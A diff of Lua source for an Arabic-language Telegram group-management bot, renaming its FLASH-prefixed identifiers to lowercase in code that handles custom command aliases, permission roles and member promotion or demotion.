 local chat = chats[msg.chat_id_]
 text = data.message_.content_.text_
-if text and FLASHdx1:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
-local NewCmmd = FLASHdx1:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
+if text and flashdx1:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
+local NewCmmd = flashdx1:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
 if NewCmmd then
-FLASHdx1:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
-FLASHdx1:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
-FLASHdx1:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم مسح الامر من المجموعه ،", 1, 'html')
+flashdx1:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
+flashdx1:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
+flashdx1:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم مسح الامر من المجموعه ،", 1, 'html')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد هكذا امر ،", 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد هكذا امر ،", 1, 'html')
 end
-FLASHdx1:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
+flashdx1:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
 return false
 end
 if data.message_.content_.text_ then
-local NewCmmd = FLASHdx1:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
+local NewCmmd = flashdx1:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
 if NewCmmd then
 data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
 end end
---     By Developer FLASH     -- 
-if text and FLASHdx1:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
-FLASHdx1:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الامر الجديد ،", 1, 'html')
-FLASHdx1:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
-FLASHdx1:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
+--     By Developer flash     -- 
+if text and flashdx1:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
+flashdx1:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الامر الجديد ،", 1, 'html')
+flashdx1:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
+flashdx1:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
 return false
 end
-if text and FLASHdx1:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
-local NewCmd = FLASHdx1:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
-FLASHdx1:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
-FLASHdx1:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الامر الجديد ،", 1, 'html')
-FLASHdx1:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
+if text and flashdx1:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
+local NewCmd = flashdx1:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
+flashdx1:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
+flashdx1:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الامر الجديد ،", 1, 'html')
+flashdx1:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
 return false
 end
---     By Developer FLASH     -- 
-if text == "الاوامر المضافه" and FLASH11(msg) then
-local list = FLASHdx1:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_.."")
+--     By Developer flash     -- 
+if text == "الاوامر المضافه" and flash11(msg) then
+local list = flashdx1:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_.."")
 t = "❅∫ قائمه الاوامر المضافه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
-Cmds = FLASHdx1:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
+Cmds = flashdx1:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
 if Cmds then 
 t = t..""..k.."- ("..v..") « » ("..Cmds..")\n"
 else
@@ -1129,231 +1129,231 @@ end end
 if #list == 0 then
 t = "❅∫ لايوجد اوامر مضافه ."
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, "["..t.."]", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "["..t.."]", 1, 'md')
 end
---     By Developer FLASH     -- 
-if text == "حذف الاوامر المضافه" or text == "مسح الاوامر المضافه" and FLASH11(msg) then
-local list = FLASHdx1:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
+--     By Developer flash     -- 
+if text == "حذف الاوامر المضافه" or text == "مسح الاوامر المضافه" and flash11(msg) then
+local list = flashdx1:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
 for k,v in pairs(list) do
-FLASHdx1:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
-FLASHdx1:del(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
+flashdx1:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
+flashdx1:del(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم مسح الاوامر المضافه .", 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم مسح الاوامر المضافه .", 1, 'html')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == "اضف امر" then
-FLASHdx1:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الامر القديم .", 1, 'html')
+flashdx1:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الامر القديم .", 1, 'html')
 return false
 end
---     By Developer FLASH     -- 
-if text == "حذف امر" or text == "مسح امر" and FLASH11(msg) then 
-FLASHdx1:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الامر الذي قمت باضافته يدويا .", 1, 'html')
+--     By Developer flash     -- 
+if text == "حذف امر" or text == "مسح امر" and flash11(msg) then 
+flashdx1:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الامر الذي قمت باضافته يدويا .", 1, 'html')
 return false 
 end
---     By Developer FLASH     -- 
-if text == "الصلاحيات" and FLASH11(msg) then 
-local list = FLASHdx1:smembers(bot_id.."Coomds"..msg.chat_id_)
+--     By Developer flash     -- 
+if text == "الصلاحيات" and flash11(msg) then 
+local list = flashdx1:smembers(bot_id.."Coomds"..msg.chat_id_)
 if #list == 0 then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد صلاحيات مضافه .", 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد صلاحيات مضافه .", 1, 'html')
 return false
 end
 t = "❅∫ قائمه الصلاحيات المضافه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
-var = FLASHdx1:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
+var = flashdx1:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
 if var then
 t = t..""..k.."- ("..v..") « » ("..var..")\n"
 else
 t = t..""..k.."- ("..v..")\n"
 end end
-FLASHdx(msg.chat_id_, msg.id_, 1, t, 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, t, 1, 'html')
 end
---     By Developer FLASH     -- 
-if text == "مسح الصلاحيات" and FLASH11(msg) then
-local list = FLASHdx1:smembers(bot_id.."Coomds"..msg.chat_id_)
+--     By Developer flash     -- 
+if text == "مسح الصلاحيات" and flash11(msg) then
+local list = flashdx1:smembers(bot_id.."Coomds"..msg.chat_id_)
 for k,v in pairs(list) do
-FLASHdx1:del(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
-FLASHdx1:del(bot_id.."Coomds"..msg.chat_id_)
+flashdx1:del(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
+flashdx1:del(bot_id.."Coomds"..msg.chat_id_)
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم مسح جميع الصلاحيات .", 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم مسح جميع الصلاحيات .", 1, 'html')
 end
---     By Developer FLASH     -- 
-if text and text:match("^اضف صلاحيه (.*)$") and FLASH11(msg) then 
+--     By Developer flash     -- 
+if text and text:match("^اضف صلاحيه (.*)$") and flash11(msg) then 
 ComdNew = text:match("^اضف صلاحيه (.*)$")
-FLASHdx1:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
-FLASHdx1:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
-FLASHdx1:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل نوع الصلاحيه ،\n❅∫ { عضو - مميز - ادمن - مدير }", 1, 'html') 
+flashdx1:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
+flashdx1:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
+flashdx1:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل نوع الصلاحيه ،\n❅∫ { عضو - مميز - ادمن - مدير }", 1, 'html') 
 end
---     By Developer FLASH     -- 
-if text and text:match("^مسح صلاحيه (.*)$") or text and text:match("^حذف صلاحيه (.*)$") and FLASH11(msg) then 
+--     By Developer flash     -- 
+if text and text:match("^مسح صلاحيه (.*)$") or text and text:match("^حذف صلاحيه (.*)$") and flash11(msg) then 
 ComdNew = text:match("^مسح صلاحيه (.*)$") or text:match("^حذف صلاحيه (.*)$")
-FLASHdx1:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم مسح الصلاحيه .", 1, 'html')
+flashdx1:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم مسح الصلاحيه .", 1, 'html')
 end
-if FLASHdx1:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
+if flashdx1:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء الامر .", 1, 'html')
-FLASHdx1:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء الامر .", 1, 'html')
+flashdx1:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
 return false  
 end 
 if text == "مدير" then
 if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل نوع الصلاحيه ،\n❅∫ { عضو - مميز - ادمن }", 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل نوع الصلاحيه ،\n❅∫ { عضو - مميز - ادمن }", 1, 'html')
 return false
 end end
 if text == "ادمن" then
 if not is_owner(msg.sender_user_id_, msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل نوع الصلاحيه ،\n❅∫ { عضو - مميز }", 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل نوع الصلاحيه ،\n❅∫ { عضو - مميز }", 1, 'html')
 return false
 end end
 if text == "مميز" then
 if not is_momod(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل نوع الصلاحيه ،\n❅∫ تستطيع اضافه صلاحيه { عضو } فقط", 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل نوع الصلاحيه ،\n❅∫ تستطيع اضافه صلاحيه { عضو } فقط", 1, 'html')
 return false
 end end
 if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
-local textn = FLASHdx1:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
-FLASHdx1:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الصلاحيه .", 1, 'html')
-FLASHdx1:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
+local textn = flashdx1:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
+flashdx1:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الصلاحيه .", 1, 'html')
+flashdx1:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
 return false  
 end end
---     By Developer FLASH     -- 
-if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 and FLASH11(msg) then 
-local FLASHrt = text:match("رفع (.*)")
-if FLASHdx1:sismember(bot_id.."Coomds"..msg.chat_id_,FLASHrt) then
+--     By Developer flash     -- 
+if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 and flash11(msg) then 
+local flashrt = text:match("رفع (.*)")
+if flashdx1:sismember(bot_id.."Coomds"..msg.chat_id_,flashrt) then
 function by_reply(extra, result, success)   
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-local fdrt = FLASHdx1:get(bot_id.."Comd:New:rt:bot:"..FLASHrt..msg.chat_id_)
+local fdrt = flashdx1:get(bot_id.."Comd:New:rt:bot:"..flashrt..msg.chat_id_)
 if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم رفعه ( '..FLASHrt..' )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n*', 1, 'md')
-FLASHdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,FLASHrt) 
-FLASHdx1:sadd(FLASH..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم رفعه ( '..flashrt..' )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n*', 1, 'md')
+flashdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,flashrt) 
+flashdx1:sadd(flash..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
 elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم رفعه ( '..FLASHrt..' )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n*', 1, 'md')
-FLASHdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,FLASHrt)
-FLASHdx1:sadd(FLASH..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم رفعه ( '..flashrt..' )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n*', 1, 'md')
+flashdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,flashrt)
+flashdx1:sadd(flash..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
 elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم رفعه ( '..FLASHrt..' )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n*', 1, 'md')
-FLASHdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,FLASHrt)  
-FLASHdx1:sadd(FLASH..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم رفعه ( '..flashrt..' )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n*', 1, 'md')
+flashdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,flashrt)  
+flashdx1:sadd(flash..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
 elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم رفعه ( '..FLASHrt..' )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم رفعه ( '..flashrt..' )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n*', 1, 'md')
 end end,nil) end   
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
 end end
---     By Developer FLASH     -- 
-if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 and FLASH11(msg) then 
-local FLASHrt = text:match("تنزيل (.*)")
-if FLASHdx1:sismember(bot_id.."Coomds"..msg.chat_id_,FLASHrt) then
+--     By Developer flash     -- 
+if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 and flash11(msg) then 
+local flashrt = text:match("تنزيل (.*)")
+if flashdx1:sismember(bot_id.."Coomds"..msg.chat_id_,flashrt) then
 function by_reply(extra, result, success)   
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-local fdrt = FLASHdx1:get(bot_id.."Comd:New:rt:bot:"..FLASHrt..msg.chat_id_)
+local fdrt = flashdx1:get(bot_id.."Comd:New:rt:bot:"..flashrt..msg.chat_id_)
 if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم تنزيله من ( '..FLASHrt..' )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n*', 1, 'md')
-FLASHdx1:srem(FLASH..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
-FLASHdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم تنزيله من ( '..flashrt..' )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n*', 1, 'md')
+flashdx1:srem(flash..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
+flashdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم تنزيله من ( '..FLASHrt..' )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n*', 1, 'md')
-FLASHdx1:srem(FLASH..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
-FLASHdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم تنزيله من ( '..flashrt..' )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n*', 1, 'md')
+flashdx1:srem(flash..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
+flashdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم تنزيله من ( '..FLASHrt..' )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n*', 1, 'md')
-FLASHdx1:srem(FLASH..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
-FLASHdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم تنزيله من ( '..flashrt..' )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n*', 1, 'md')
+flashdx1:srem(flash..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
+flashdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم تنزيله من ( '..FLASHrt..' )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'FAQY4')..')'..' )\n❅∫ *تم تنزيله من ( '..flashrt..' )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n*', 1, 'md')
 end end,nil) end   
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
 end end
---     By Developer FLASH     -- 
-if text and text:match("^رفع (.*) @(.*)") and FLASH11(msg) then 
+--     By Developer flash     -- 
+if text and text:match("^رفع (.*) @(.*)") and flash11(msg) then 
 local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
-if FLASHdx1:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
+if flashdx1:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
 function py_username(extra, result, success)   
 if result.id_ then
-local fdrt = FLASHdx1:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
+local fdrt = flashdx1:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
 if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم رفعه ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_FLASH(msg)..' )\n', 1, 'md')
-FLASHdx1:sadd(FLASH..'bot:vipmem:'..msg.chat_id_, result.id_)
-FLASHdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم رفعه ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_flash(msg)..' )\n', 1, 'md')
+flashdx1:sadd(flash..'bot:vipmem:'..msg.chat_id_, result.id_)
+flashdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم رفعه ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_FLASH(msg)..' )\n', 1, 'md')
-FLASHdx1:sadd(FLASH..'bot:momod:'..msg.chat_id_, result.id_)
-FLASHdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم رفعه ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_flash(msg)..' )\n', 1, 'md')
+flashdx1:sadd(flash..'bot:momod:'..msg.chat_id_, result.id_)
+flashdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم رفعه ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_FLASH(msg)..' )\n', 1, 'md')
-FLASHdx1:sadd(FLASH..'bot:owners:'..msg.chat_id_, result.id_)
-FLASHdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم رفعه ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_flash(msg)..' )\n', 1, 'md')
+flashdx1:sadd(flash..'bot:owners:'..msg.chat_id_, result.id_)
+flashdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم رفعه ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_FLASH(msg)..' )\n', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم رفعه ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_flash(msg)..' )\n', 1, 'md')
 end else
 info = "❅∫ المعرف غير صحيح"
-FLASHdx(msg.chat_id_, msg.id_, 1, info, 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, info, 1, 'html')
 end end
 tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
 end end
---     By Developer FLASH     -- 
-if text and text:match("^تنزيل (.*) @(.*)") and FLASH11(msg) then 
+--     By Developer flash     -- 
+if text and text:match("^تنزيل (.*) @(.*)") and flash11(msg) then 
 local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
-if FLASHdx1:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
+if flashdx1:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
 function py_username(extra, result, success)   
 if result.id_ then
-local fdrt = FLASHdx1:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
+local fdrt = flashdx1:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
 if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
